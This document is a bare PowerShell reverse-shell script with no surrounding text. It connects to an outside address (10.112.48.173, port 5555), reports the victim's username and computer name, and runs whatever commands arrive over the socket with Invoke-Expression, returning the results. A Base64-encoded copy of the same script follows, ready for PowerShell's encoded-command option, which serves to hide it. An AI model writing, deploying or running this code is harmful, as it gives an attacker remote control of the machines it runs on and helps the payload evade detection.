Process {
$modules=@()
$c=New-Object System.Net.Sockets.TCPClient("10.112.48.173",5555)
$s=$c.GetStream()
[byte[]]$b=0..20000|%{0}
$d=([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user "+$env:username+" on "+$env:computername+"`nEnjoy!.`n`n")
$s.Write($d,0,$d.Length)
$d=([text.encoding]::ASCII).GetBytes("PS "+(Get-Location).Path+">")
$s.Write($d,0,$d.Length)
while(($i=$s.Read($b,0,$b.Length)) -ne 0)
{
$E=New-Object -TypeName System.Text.ASCIIEncoding
$D=$E.GetString($b,0,$i)
$k=(Invoke-Expression -Command $D | Out-String)
$l=$k+"PS "+(Get-Location).Path+">"
$x=($error[0] | Out-String)
$error.clear()
$l=$l+$x
$d=([text.encoding]::ASCII).GetBytes($l)
$s.Write($d,0,$d.Length)
$s.Flush()
}
$c.Close()
}


/* Encoded command (Unicode) */
/* UAByAG8AYwBlAHMAcwAgAHsACgAkAG0AbwBkAHUAbABlAHMAPQBAACgAKQAKACQAYwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAIgAxADAALgAxADEAMgAuADQAOAAuADEANwAzACIALAA1ADUANQA1ACkACgAkAHMAPQAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkACgBbAGIAeQB0AGUAWwBdAF0AJABiAD0AMAAuAC4AMgAwADAAMAAwAHwAJQB7ADAAfQAKACQAZAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAIgBXAGkAbgBkAG8AdwBzACAAUABvAHcAZQByAFMAaABlAGwAbAAgAHIAdQBuAG4AaQBuAGcAIABhAHMAIAB1AHMAZQByACAAIgArACQAZQBuAHYAOgB1AHMAZQByAG4AYQBtAGUAKwAiACAAbwBuACAAIgArACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQArACIAYABuAEUAbgBqAG8AeQAhAC4AYABuAGAAbgAiACkACgAkAHMALgBXAHIAaQB0AGUAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQAKACQAZAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAIgBQAFMAIAAiACsAKABHAGUAdAAtAEwAbwBjAGEAdABpAG8AbgApAC4AUABhAHQAaAArACIAPgAiACkACgAkAHMALgBXAHIAaQB0AGUAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQAKAHcAaABpAGwAZQAoACgAJABpAD0AJABzAC4AUgBlAGEAZAAoACQAYgAsADAALAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQAKAHsACgAkAEUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnAAoAJABEAD0AJABFAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIALAAwACwAJABpACkACgAkAGsAPQAoAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgAC0AQwBvAG0AbQBhAG4AZAAgACQARAAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAkAGwAPQAkAGsAKwAiAFAAUwAgACIAKwAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACsAIgA+ACIACgAkAHgAPQAoACQAZQByAHIAbwByAFsAMABdACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAKACQAZQByAHIAbwByAC4AYwBsAGUAYQByACgAKQAKACQAbAA9ACQAbAArACQAeAAKACQAZAA9ACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABsACkACgAkAHMALgBXAHIAaQB0AGUAKAAkAGQALAAwACwAJABkAC4ATABlAG4AZwB0AGgAKQAKACQAcwAuAEYAbAB1AHMAaAAoACkACgB9AAoAJABjAC4AQwBsAG8AcwBlACgAKQAKAH0ACgA= */